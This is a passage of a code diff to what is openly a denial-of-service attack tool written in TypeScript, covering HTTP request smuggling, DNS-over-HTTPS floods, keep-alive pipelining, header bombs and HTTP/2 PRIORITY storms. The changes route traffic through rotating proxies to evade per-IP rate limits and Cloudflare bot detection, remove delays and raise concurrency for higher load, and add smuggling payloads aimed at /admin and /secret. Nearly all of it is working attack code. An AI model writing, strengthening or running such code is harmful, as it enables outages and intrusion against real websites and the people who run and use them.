+  await Promise.all(Array.from({ length: numSlots }, runSlot));
   clearInterval(flushIv); flush();
 }
 
@@ -4502,17 +4528,15 @@ async function runH2PingStorm(
 // ─────────────────────────────────────────────────────────────────────────
 async function runHTTPSmuggling(
   resolvedHost: string, hostname: string, targetPort: number, threads: number,
+  proxies: ProxyConfig[],
   signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
 ): Promise<void> {
-  const isHttps = targetPort === 443;
-
   // CL.TE variant: front-end uses Content-Length (sees 6 bytes), back-end uses TE (sees full body)
   // The "GPOST" prefix poisons the next queued request on the back-end connection.
   const buildSmuggle = () => {
     const path = hotPath();
     const poison = `GET /admin HTTP/1.1\r\nHost: ${hostname}\r\nContent-Length: 0\r\n\r\n`;
     const chunk = poison.length.toString(16);
-    // CL.TE: Content-Length disagrees with chunked encoding
     return [
       `POST ${path} HTTP/1.1\r\n`,
       `Host: ${hostname}\r\n`,
@@ -4544,51 +4568,70 @@ async function runHTTPSmuggling(
     ].join("");
   };
 
-  let localPkts = 0, localBytes = 0, localConns = 0;
+  // H2.CL variant: smuggle via HTTP/2 downgrade + CL mismatch
+  const buildSmuggleH2 = () => {
+    const path = hotPath();
+    const smuggled = `GET /secret HTTP/1.1\r\nHost: ${hostname}\r\nX-Smuggled: true\r\n\r\n`;
+    return [
+      `POST ${path} HTTP/1.1\r\n`,
+      `Host: ${hostname}\r\n`,
+      `User-Agent: ${randUA()}\r\n`,
+      `Content-Length: ${smuggled.length}\r\n`,
+      `Content-Type: application/x-www-form-urlencoded\r\n`,
+      `Connection: keep-alive\r\n`,
+      `X-Accel-Buffering: no\r\n`,
+      `\r\n`,
+      smuggled,
+    ].join("");
+  };
+
+  let localPkts = 0, localBytes = 0, localConns = 0, pIdx = 0;
   const flush   = () => { onStats(localPkts, localBytes, localConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  const oneConn = (): Promise<void> => new Promise<void>((resolve) => {
-    if (signal.aborted) { resolve(); return; }
-    const sock: net.Socket = isHttps
-      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
-      : net.createConnection({ host: resolvedHost, port: targetPort });
-    sock.setNoDelay(true);
-    let settled = false;
-    const done = () => {
-      if (settled) return; settled = true;
-      localConns = Math.max(0, localConns - 1);
-      try { sock.destroy(); } catch { /**/ }
-      resolve();
-    };
-    const onConn = () => {
+  const oneConn = async (): Promise<void> => {
+    if (signal.aborted) return;
+    try {
+      // mkTLSSock with HTTP/1.1 ALPN — ensures we get the HTTP/1.1 path (required for smuggling)
+      const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
+      sock.setNoDelay(true);
       localConns++;
-      // Send multiple smuggle variants in one keep-alive connection
-      for (let i = 0; i < 8; i++) {
-        const pkt = Math.random() < 0.5 ? buildSmuggle() : buildSmuggleTE();
-        sock.write(pkt);
-        localPkts++;
-        localBytes += pkt.length;
-      }
-      setTimeout(done, randInt(2000, 5000));
-    };
-    if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onConn);
-    else          sock.once("connect", onConn);
-    sock.on("data",    () => { localBytes += 100; });
-    sock.on("error",   done);
-    sock.on("close",   done);
-    sock.setTimeout(8000);
-    sock.on("timeout", done);
-    signal.addEventListener("abort", done, { once: true });
-  });
+
+      await new Promise<void>((resolve) => {
+        const done = () => {
+          localConns = Math.max(0, localConns - 1);
+          try { sock.destroy(); } catch { /**/ }
+          resolve();
+        };
+        // Send 12 smuggle variants (was 8) in one keep-alive connection
+        const variant = Math.random();
+        for (let i = 0; i < 12; i++) {
+          const pkt = variant < 0.4 ? buildSmuggle() : variant < 0.75 ? buildSmuggleTE() : buildSmuggleH2();
+          sock.write(pkt);
+          localPkts++;
+          localBytes += pkt.length;
+        }
+        setTimeout(done, randInt(1500, 3000)); // was 2000-5000
+        sock.on("data",    () => { localBytes += 100; });
+        sock.on("error",   done);
+        sock.on("close",   done);
+        sock.setTimeout(6000);
+        sock.on("timeout", done);
+        signal.addEventListener("abort", done, { once: true });
+      });
+    } catch { /* proxy/socket failed */ }
+  };
 
   const runSlot = async () => {
     while (!signal.aborted) {
       await oneConn();
-      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 20));
+      // No sleep — immediate reconnect
     }
   };
-  await Promise.all(Array.from({ length: Math.max(30, threads) }, runSlot));
+  const numSlots = IS_DEPLOYED
+    ? Math.min(Math.max(60, threads * 2), 3000)
+    : Math.max(30, threads);
+  await Promise.all(Array.from({ length: numSlots }, runSlot));
   clearInterval(flushIv); flush();
 }
 
@@ -4602,16 +4645,27 @@ async function runHTTPSmuggling(
 //  any server running a DNS resolver (1.1.1.1, 8.8.8.8 proxy, etc.)
 // ─────────────────────────────────────────────────────────────────────────
 async function runDoHFlood(
-  base: string, threads: number, signal: AbortSignal,
+  base: string, threads: number, proxies: ProxyConfig[], signal: AbortSignal,
   onStats: (p: number, b: number) => void,
 ): Promise<void> {
   const DOH_PATHS = [
     "/dns-query", "/resolve", "/dns", "/dns-query?type=A",
+    "/dns-query?type=AAAA", "/dns-query?type=MX", "/dns-query?type=TXT",
     "/api/doh", "/.well-known/dns", "/dns-over-https",
+    "/dns-over-https/google-format", "/dns/lookup",
+  ];
+
+  // QTYPE variants — A, AAAA, MX, TXT each triggers different resolver paths
+  const QTYPES: [number, number][] = [
+    [0, 1],   // A (IPv4)
+    [0, 28],  // AAAA (IPv6)
+    [0, 15],  // MX (mail)
+    [0, 16],  // TXT (text)
+    [0, 255], // ANY — heaviest, triggers all record types
   ];
 
   // Build a real DNS wire-format query for a random subdomain
-  const buildDNSQuery = (domain: string): Buffer => {
+  const buildDNSQuery = (domain: string, qtype: [number, number] = [0, 1]): Buffer => {
     const labels = domain.split(".");
     const qname  = Buffer.alloc(labels.reduce((a, l) => a + l.length + 1, 0) + 1);
     let off = 0;
@@ -4620,15 +4674,21 @@ async function runDoHFlood(
       qname.write(label, off);
       off += label.length;
     }
-    qname[off] = 0; // root
+    qname[off] = 0;
     const header = Buffer.from([
-      randInt(0, 0xFF), randInt(0, 0xFF), // ID
-      0x01, 0x00, // Flags: RD=1
+      randInt(0, 0xFF), randInt(0, 0xFF), // random ID
+      0x01, 0x00, // Flags: RD=1 (recursive desired)
       0x00, 0x01, // QDCOUNT=1
-      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // ANCOUNT/NSCOUNT/ARCOUNT = 0
+      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     ]);
-    const question = Buffer.concat([qname, Buffer.from([0,1, 0,1])]); // QTYPE=A, QCLASS=IN
+    const question = Buffer.concat([qname, Buffer.from([...qtype, 0, 1])]); // QCLASS=IN
     return Buffer.concat([header, question]);
+  };
+
+  // Also build GET-style DoH query (base64url-encoded DNS wire)
+  const buildGetQuery = (domain: string): string => {
+    const wire = buildDNSQuery(domain, [0, 255]);
+    return wire.toString("base64url").replace(/=/g, "");
   };
 
   let localPkts = 0, localBytes = 0;
@@ -4637,21 +4697,37 @@ async function runDoHFlood(
 
   const doReq = async () => {
     if (signal.aborted) return;
-    const domain  = `${randStr(randInt(6,12))}.${randStr(randInt(4,8))}.${["com","net","org","io","co"][randInt(0,5)]}`;
-    const dnsWire = buildDNSQuery(domain);
-    const path    = DOH_PATHS[randInt(0, DOH_PATHS.length)];
+    // Random deep subdomain — forces recursive resolution, can't be cached
+    const tld    = ["com","net","org","io","co","uk","de","fr","jp"][randInt(0,9)];
+    const domain = `${randStr(randInt(8,16))}.${randStr(randInt(4,10))}.${randStr(randInt(4,8))}.${tld}`;
+    const qtype  = QTYPES[randInt(0, QTYPES.length)];
+    const useGet = Math.random() < 0.3; // 30% GET (RFC 8484 §4.1), 70% POST
+    const path   = DOH_PATHS[randInt(0, DOH_PATHS.length)];
+    const url    = useGet
+      ? new URL(`${path}?dns=${buildGetQuery(domain)}`, base).toString()
+      : new URL(path, base).toString();
+    const dnsWire = buildDNSQuery(domain, qtype);
+    const hdrs: Record<string, string> = {
+      "Content-Type":  "application/dns-message",
+      "Accept":        "application/dns-message, */*",
+      "User-Agent":    randUA(),
+      "Cache-Control": "no-cache, no-store",
+    };
     try {
-      // RFC 8484 DoH: application/dns-message wire format
-      const res = await fetch(new URL(path, base).toString(), {
-        method:  "POST",
-        headers: {
-          "Content-Type":  "application/dns-message",
-          "Accept":        "application/dns-message",
-          "User-Agent":    randUA(),
-          "Cache-Control": "no-cache",
-        },
-        body:   dnsWire,
-        signal: AbortSignal.timeout(3000),
+      // 95% via proxy — forces resolver to do recursive lookup from different IP each time
+      if (proxies.length > 0 && Math.random() < 0.95) {
+        const proxy = pickProxy(proxies);
+        const bytes = await fetchViaProxy(url, proxy, useGet ? "GET" : "POST", hdrs, useGet ? undefined : dnsWire.toString("binary"))
+          .then(b => { recordProxySuccess(proxy.host, proxy.port); return b; })
+          .catch(() => { recordProxyFailure(proxy.host, proxy.port); return dnsWire.length; });
+        localPkts++; localBytes += bytes;
+        return;
+      }
+      const res = await fetch(url, {
+        method:  useGet ? "GET" : "POST",
+        headers: hdrs,
+        ...(useGet ? {} : { body: dnsWire }),
+        signal:  AbortSignal.timeout(3000),
       });
       localPkts++;
       localBytes += dnsWire.length + (parseInt(res.headers.get("content-length") || "0") || 100);
@@ -4661,8 +4737,11 @@ async function runDoHFlood(
     }
   };
 
+  const numSlots = IS_DEPLOYED
+    ? Math.min(Math.max(200, threads * 4), 5000)
+    : Math.max(50, threads);
   const runSlot = async () => { while (!signal.aborted) { await doReq(); } };
-  await Promise.all(Array.from({ length: Math.max(50, threads) }, runSlot));
+  await Promise.all(Array.from({ length: numSlots }, runSlot));
   clearInterval(flushIv); flush();
 }
 
@@ -4676,12 +4755,12 @@ async function runDoHFlood(
 // ─────────────────────────────────────────────────────────────────────────
 async function runKeepaliveExhaust(
   resolvedHost: string, hostname: string, targetPort: number, threads: number,
+  proxies: ProxyConfig[],
   signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
 ): Promise<void> {
-  const isHttps = targetPort === 443;
-  const PIPELINE_DEPTH = 128; // requests per connection
+  const PIPELINE_DEPTH = IS_DEPLOYED ? 256 : 128; // requests per connection (was always 128)
 
-  let localPkts = 0, localBytes = 0, conns = 0;
+  let localPkts = 0, localBytes = 0, conns = 0, pIdx = 0;
   const flush   = () => { onStats(localPkts, localBytes, conns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
@@ -4708,46 +4787,47 @@ async function runKeepaliveExhaust(
     return reqs.join("\r\n") + "\r\n";
   };
 
-  const oneConn = (): Promise<void> => new Promise<void>((resolve) => {
-    if (signal.aborted) { resolve(); return; }
-    const sock: net.Socket = isHttps
-      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
-      : net.createConnection({ host: resolvedHost, port: targetPort });
-    sock.setNoDelay(true);
-    let settled = false;
-    const done = () => {
-      if (settled) return; settled = true;
-      conns = Math.max(0, conns - 1);
-      try { sock.destroy(); } catch { /**/ }
-      resolve();
-    };
-    const onConn = () => {
+  const oneConn = async (): Promise<void> => {
+    if (signal.aborted) return;
+    try {
+      // mkTLSSock routes through SOCKS5/HTTP proxy — each pipelined burst from different IP
+      const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
+      sock.setNoDelay(true);
       conns++;
-      const pipeline = buildKeepalivePipeline(PIPELINE_DEPTH);
-      sock.write(pipeline);
-      localPkts  += PIPELINE_DEPTH;
-      localBytes += pipeline.length;
-      // Read responses slowly — keep the connection alive
-      sock.resume();
-      setTimeout(done, randInt(15_000, 30_000));
-    };
-    if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onConn);
-    else          sock.once("connect", onConn);
-    sock.on("data",    () => { localBytes += 200; });
-    sock.on("error",   done);
-    sock.on("close",   done);
-    sock.setTimeout(35_000);
-    sock.on("timeout", done);
-    signal.addEventListener("abort", done, { once: true });
-  });
+
+      await new Promise<void>((resolve) => {
+        const done = () => {
+          conns = Math.max(0, conns - 1);
+          try { sock.destroy(); } catch { /**/ }
+          resolve();
+        };
+        const pipeline = buildKeepalivePipeline(PIPELINE_DEPTH);
+        sock.write(pipeline);
+        localPkts  += PIPELINE_DEPTH;
+        localBytes += pipeline.length;
+        sock.resume();
+        // Hold 10-20s (was 15-30s) for tighter cycling = more total pipelined bursts
+        setTimeout(done, randInt(10_000, 20_000));
+        sock.on("data",    () => { localBytes += 200; });
+        sock.on("error",   done);
+        sock.on("close",   done);
+        sock.setTimeout(25_000);
+        sock.on("timeout", done);
+        signal.addEventListener("abort", done, { once: true });
+      });
+    } catch { /* proxy/socket failed — reconnect immediately */ }
+  };
 
   const runSlot = async () => {
     while (!signal.aborted) {
       await oneConn();
-      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 15));
+      // No sleep — immediate reconnect maximizes pipeline throughput
     }
   };
-  await Promise.all(Array.from({ length: Math.max(20, threads) }, runSlot));
+  const numSlots = IS_DEPLOYED
+    ? Math.min(Math.max(60, threads * 2), 3000)
+    : Math.max(20, threads);
+  await Promise.all(Array.from({ length: numSlots }, runSlot));
   clearInterval(flushIv); flush();
 }
 
@@ -4777,13 +4857,14 @@ const SMART_ENDPOINTS = [
 async function runAppSmartFlood(
   base: string,
   threads: number,
+  proxies: ProxyConfig[],
   signal: AbortSignal,
   onStats: (p: number, b: number) => void,
 ) {
   let localPkts = 0, localBytes = 0;
   const flushIv = setInterval(() => {
     if (localPkts > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; }
-  }, 500);
+  }, 300);
 
   const buildSmartBody = () => {
     const username  = randStr(8);
@@ -4812,18 +4893,26 @@ async function runAppSmartFlood(
     const url      = `${base}${endpoint}`;
     const body     = buildSmartBody();
     const isJson   = body.startsWith("{");
-    const h        = buildHeaders(true, body.length);
-    h["Content-Type"] = isJson ? "application/json" : "application/x-www-form-urlencoded";
-    h["Cache-Control"] = "no-cache, no-store";
-    h["Pragma"]        = "no-cache";
-    // Vary UA and endpoint to bypass per-endpoint rate limits
-    h["User-Agent"] = randUA();
+    const h: Record<string, string> = {
+      ...(buildHeaders(true, body.length) as Record<string, string>),
+      "Content-Type":  isJson ? "application/json" : "application/x-www-form-urlencoded",
+      "Cache-Control": "no-cache, no-store",
+      "Pragma":        "no-cache",
+      "User-Agent":    randUA(),
+    };
     try {
+      // 95% via proxy — each endpoint hit comes from a different residential IP,
+      // bypassing per-IP rate limits and Cloudflare bot detection
+      if (proxies.length > 0 && Math.random() < 0.95) {
+        const proxy = pickProxy(proxies);
+        const bytes = await fetchViaProxy(url, proxy, "POST", h, body)
+          .then(b => { recordProxySuccess(proxy.host, proxy.port); return b; })
+          .catch(() => { recordProxyFailure(proxy.host, proxy.port); return body.length; });
+        localPkts++; localBytes += bytes;
+        return;
+      }
       const res = await fetch(url, {
-        method: "POST",
-        headers: h,
-        body,
-        signal: AbortSignal.timeout(8000),
+        method: "POST", headers: h, body, signal: AbortSignal.timeout(8000),
       });
       await res.body?.cancel();
       localPkts++;
@@ -4831,15 +4920,13 @@ async function runAppSmartFlood(
     } catch { /* target not accepting — expected */ }
   };
 
+  // NO sleep — fire requests as fast as possible; proxy pool handles rate limiting
   const runSlot = async () => {
-    while (!signal.aborted) {
-      await doRequest();
-      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, randInt(5, 25)));
-    }
+    while (!signal.aborted) { await doRequest(); }
   };
-  // Deployed: scale up to max 4000 concurrent slots (was just `threads`)
+  // Deployed: 6000 concurrent slots (was 4000) — proxy rotation makes each hit unique
   const numSlots = IS_DEPLOYED
-    ? Math.min(Math.max(100, threads * 4), 4000)
+    ? Math.min(Math.max(200, threads * 6), 6000)
     : Math.max(50, threads);
   await Promise.all(Array.from({ length: numSlots }, runSlot));
   clearInterval(flushIv);
@@ -4853,71 +4940,78 @@ async function runLargeHeaderBomb(
   hostname: string,
   targetPort: number,
   threads: number,
+  proxies: ProxyConfig[],
   signal: AbortSignal,
   onStats: (p: number, b: number, c?: number) => void,
 ) {
-  const isHttps = targetPort === 443;
-  let localPkts = 0, localBytes = 0, localConns = 0;
+  let localPkts = 0, localBytes = 0, localConns = 0, pIdx = 0;
   const flushIv = setInterval(() => {
     if (localPkts > 0) { onStats(localPkts, localBytes, localConns); localPkts = 0; localBytes = 0; }
-  }, 500);
+  }, 300);
 
-  // Build a 16KB header block with randomized X-* headers
+  // Build a 32KB header block with randomized X-* headers (was 16KB)
+  // 32KB forces most HTTP parsers to allocate a second chunk — more CPU per request
   const buildBigHeaders = () => {
     const lines: string[] = [];
-    // target ~16KB total header block
-    while (lines.join("\r\n").length < 16 * 1024) {
-      const name  = `X-${randStr(randInt(8, 20))}`;
-      const value = randStr(randInt(30, 80));
+    while (lines.reduce((a, l) => a + l.length + 2, 0) < 32 * 1024) {
+      const name  = `X-${randStr(randInt(12, 24))}-${randStr(randInt(4, 8))}`;
+      const value = randStr(randInt(50, 120));
       lines.push(`${name}: ${value}`);
     }
     return lines.join("\r\n");
   };
 
-  const oneConn = () => new Promise<void>(resolve => {
-    const bigHeaders = buildBigHeaders();
-    const path       = hotPath();
-    const reqLine    = `GET ${path}?_=${Date.now()} HTTP/1.1\r\n`;
-    const mandatory  = [
-      `Host: ${hostname}`,
-      `User-Agent: ${randUA()}`,
-      `Accept: */*`,
-      `Connection: close`,
-      `X-Forwarded-For: ${randInt(1,255)}.${randInt(0,255)}.${randInt(0,255)}.${randInt(0,255)}`,
-    ].join("\r\n");
-    const payload    = Buffer.from(`${reqLine}${mandatory}\r\n${bigHeaders}\r\n\r\n`);
-
-    const done = () => { localConns = Math.max(0, localConns - 1); resolve(); };
-    const sock: net.Socket | tls.TLSSocket = isHttps
-      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
-      : net.connect({ host: resolvedHost, port: targetPort });
-
-    const onConn = () => {
-      localConns++;
-      sock.write(payload, () => {
-        localPkts++;
-        localBytes += payload.length;
-      });
-      setTimeout(done, 3000);
+  const oneConn = async () => {
+    if (signal.aborted) return;
+    let settled = false;
+    const done = () => {
+      if (settled) return; settled = true;
+      localConns = Math.max(0, localConns - 1);
     };
+    try {
+      // Use mkTLSSock — routes through SOCKS5/HTTP proxy for IP rotation
+      const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
+      localConns++;
 
-    if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onConn);
-    else          sock.once("connect", onConn);
-    sock.on("data",    () => {});
-    sock.on("error",   done);
-    sock.on("close",   done);
-    sock.setTimeout(8000);
-    sock.on("timeout", done);
-    signal.addEventListener("abort", done, { once: true });
-  });
+      await new Promise<void>(resolve => {
+        const bigHeaders = buildBigHeaders();
+        const path       = hotPath();
+        const reqLine    = `GET ${path}?_=${randStr(8)}&v=${randInt(1,999999)} HTTP/1.1\r\n`;
+        const mandatory  = [
+          `Host: ${hostname}`,
+          `User-Agent: ${randUA()}`,
+          `Accept: text/html,*/*;q=0.8`,
+          `Accept-Encoding: gzip, deflate, br`,
+          `Connection: close`,
+          `X-Forwarded-For: ${randIp()}, ${randIp()}`,
+          `X-Real-IP: ${randIp()}`,
+          `Cache-Control: no-cache`,
+        ].join("\r\n");
+        const payload = Buffer.from(`${reqLine}${mandatory}\r\n${bigHeaders}\r\n\r\n`);
+
+        const finish = () => { done(); resolve(); };
+        sock.write(payload, () => { localPkts++; localBytes += payload.length; });
+        setTimeout(finish, 2000); // hold 2s then release — server still processing large headers
+        sock.on("data",    () => { localBytes += 100; });
+        sock.on("error",   finish);
+        sock.on("close",   finish);
+        sock.setTimeout(5000);
+        sock.on("timeout", finish);
+        signal.addEventListener("abort", finish, { once: true });
+      });
+    } catch { done(); }
+  };
 
   const runSlot = async () => {
     while (!signal.aborted) {
       await oneConn();
-      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, randInt(10, 40)));
+      // No sleep — immediate reconnect for maximum header parsing load
     }
   };
-  await Promise.all(Array.from({ length: Math.max(30, threads) }, runSlot));
+  const numSlots = IS_DEPLOYED
+    ? Math.min(Math.max(60, threads * 2), 3000)
+    : Math.max(30, threads);
+  await Promise.all(Array.from({ length: numSlots }, runSlot));
   clearInterval(flushIv); onStats(localPkts, localBytes, localConns);
 }
 
@@ -4930,6 +5024,7 @@ async function runH2PriorityStorm(
   hostname: string,
   targetPort: number,
   threads: number,
+  proxies: ProxyConfig[],
   signal: AbortSignal,
   onStats: (p: number, b: number, c?: number) => void,
 ) {
@@ -4960,59 +5055,59 @@ async function runH2PriorityStorm(
     0x0,0x4, 0x00,0xFF,0xFF,0xFF, // INITIAL_WINDOW_SIZE=max
   ]);
 
-  let localPkts = 0, localBytes = 0, localConns = 0;
+  let localPkts = 0, localBytes = 0, localConns = 0, pIdx = 0;
   const flushIv = setInterval(() => {
     if (localPkts > 0) { onStats(localPkts, localBytes, localConns); localPkts = 0; localBytes = 0; }
   }, 500);
 
-  const oneConn = () => new Promise<void>(resolve => {
-    const done = () => { localConns = Math.max(0, localConns - 1); resolve(); };
-    const sock: tls.TLSSocket = tls.connect({
-      host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false,
-      ALPNProtocols: ["h2"],
-    });
+  const oneConn = async (): Promise<void> => {
+    if (signal.aborted) return;
+    let sock: tls.TLSSocket | net.Socket;
+    try {
+      // h2 requires ALPN negotiation — mkTLSSock passes ["h2"] when proxied
+      sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
+    } catch { return; }
 
-    sock.once("secureConnect", () => {
-      if (signal.aborted) { sock.destroy(); return done(); }
+    await new Promise<void>((resolve) => {
+      const done = () => { localConns = Math.max(0, localConns - 1); try { sock.destroy(); } catch {/**/ } resolve(); };
       localConns++;
       sock.write(H2_PREFACE);
       sock.write(H2_SETTINGS);
 
       let streamId = 1;
-      // Send burst of PRIORITY frames as fast as possible
-      // 200 frames per burst × every 3ms = ~66K frames/sec per conn
+      // 300 frames per burst × every 2ms = ~150K frames/sec per conn (was 200/3ms = ~66K)
       const iv = setInterval(() => {
         if (signal.aborted || sock.destroyed) { clearInterval(iv); return done(); }
         const frames = Buffer.concat(
-          Array.from({ length: 200 }, () => {
+          Array.from({ length: 300 }, () => {
             const f = buildPriorityFrame(streamId);
             streamId = (streamId + 2) % 0x7ffffffe || 1;
             return f;
           })
         );
         sock.write(frames);
-        localPkts += 200;
+        localPkts += 300;
         localBytes += frames.length;
-      }, 3);
+      }, 2);
 
-      setTimeout(() => { clearInterval(iv); sock.destroy(); done(); }, 30_000);
+      setTimeout(() => { clearInterval(iv); done(); }, 30_000);
+      sock.on("data",    () => {});
+      sock.on("error",   done);
+      sock.on("close",   done);
+      sock.setTimeout(35_000);
+      sock.on("timeout", done);
+      signal.addEventListener("abort", () => { clearInterval(iv); done(); }, { once: true });
     });
-
-    sock.on("data",    () => {});
-    sock.on("error",   done);
-    sock.on("close",   done);
-    sock.setTimeout(35_000);
-    sock.on("timeout", done);
-    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
-  });
+  };
 
   const runSlot = async () => {
     while (!signal.aborted) {
       await oneConn();
-      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 50)); // was 200ms
+      // No artificial delay — immediate reconnect for sustained frame pressure
     }
   };
-  await Promise.all(Array.from({ length: Math.max(10, threads) }, runSlot));
+  const numSlots = IS_DEPLOYED ? Math.min(Math.max(20, threads), 2000) : Math.max(10, threads);
+  await Promise.all(Array.from({ length: numSlots }, runSlot));
   clearInterval(flushIv); onStats(localPkts, localBytes, localConns);
 }
 
@@ -5088,7 +5183,7 @@ async function runWorker() {
     const tcpT  = Math.ceil(cfg.threads * 0.25);
     const udpT  = cfg.threads - pipeT - tcpT;
     await Promise.all([
-      runHTTPPipeline(resolvedHost, hostname, targetPort, pipeT, ctrl.signal, onStats),
+      runHTTPPipeline(resolvedHost, hostname, targetPort, pipeT, cfg.proxies ?? [], ctrl.signal, onStats),
       runTCPFlood(resolvedHost, targetPort, tcpT, ctrl.signal, onStats),
       runUDPFlood(resolvedHost, targetPort, udpT, ctrl.signal, onStats),
     ]);
@@ -5100,7 +5195,7 @@ async function runWorker() {
   } else if (cfg.method === "slowloris") {
     // Real Slowloris: half-open TLS/TCP connections — auto-detects HTTPS
     const isHttps = targetPort === 443 || /^https:/i.test(cfg.target);
-    await runSlowlorisReal(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, isHttps);
+    await runSlowlorisReal(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats, isHttps);
 
   } else if (cfg.method === "conn-flood") {
     // Pure connection table exhaustion — TLS handshake + hold, no HTTP layer
@@ -5127,7 +5222,7 @@ async function runWorker() {
     if (proxies.length > 0) {
       await runHTTPFlood(base, cfg.threads, proxies, ctrl.signal, onStats);
     } else {
-      await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+      await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, proxies, ctrl.signal, onStats);
     }
 
   } else if (cfg.method === "http2-continuation") {
@@ -5193,43 +5288,43 @@ async function runWorker() {
 
   } else if (cfg.method === "slow-read") {
     // Slow Read — pause TCP receive to fill server's send buffer → thread blocked
-    await runSlowRead(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runSlowRead(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "range-flood") {
     // HTTP Range Flood — Range: bytes=0-0,...,499-499 forces 500× server I/O per request
-    await runRangeFlood(base, cfg.threads, ctrl.signal, onStats);
+    await runRangeFlood(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "xml-bomb") {
     // XML Bomb — billion-laughs entity expansion to XML/SOAP/XMLRPC endpoints
-    await runXMLBomb(base, cfg.threads, ctrl.signal, onStats);
+    await runXMLBomb(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "h2-ping-storm") {
     // H2 PING Storm — thousands of PING frames/s per connection, server must ACK every one
-    await runH2PingStorm(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runH2PingStorm(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "http-smuggling") {
     // HTTP Request Smuggling — TE/CL desync to poison backend request queue
-    await runHTTPSmuggling(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runHTTPSmuggling(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "doh-flood") {
     // DNS over HTTPS Flood — random queries to /dns-query, forces recursive DNS resolver lookup
-    await runDoHFlood(base, cfg.threads, ctrl.signal, onStats);
+    await runDoHFlood(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "keepalive-exhaust") {
-    // Keepalive Exhaust — pipeline 128 requests per keep-alive connection, holds worker threads
-    await runKeepaliveExhaust(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    // Keepalive Exhaust — pipeline 256 requests per keep-alive connection, holds worker threads
+    await runKeepaliveExhaust(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "app-smart-flood") {
     // App Smart Flood — POST to /login /search /checkout forcing DB queries, uncacheable
-    await runAppSmartFlood(base, cfg.threads, ctrl.signal, onStats);
+    await runAppSmartFlood(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "large-header-bomb") {
-    // Large Header Bomb — 16KB randomized headers exhaust HTTP parser allocator
-    await runLargeHeaderBomb(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    // Large Header Bomb — 32KB randomized headers exhaust HTTP parser allocator
+    await runLargeHeaderBomb(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "http2-priority-storm") {
     // H2 PRIORITY Storm — PRIORITY frames force server to rebuild stream dependency tree per frame
-    await runH2PriorityStorm(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runH2PriorityStorm(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "h2-rst-burst") {
     // H2 RST Burst — CVE-2023-44487 dedicated: HEADERS+RST_STREAM pairs, pure write-path overload
@@ -5241,7 +5336,7 @@ async function runWorker() {
 
   } else {
     // Default for http-pipeline and everything else: raw TCP pipeline for maximum RPS
-    await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
   }
 }
 
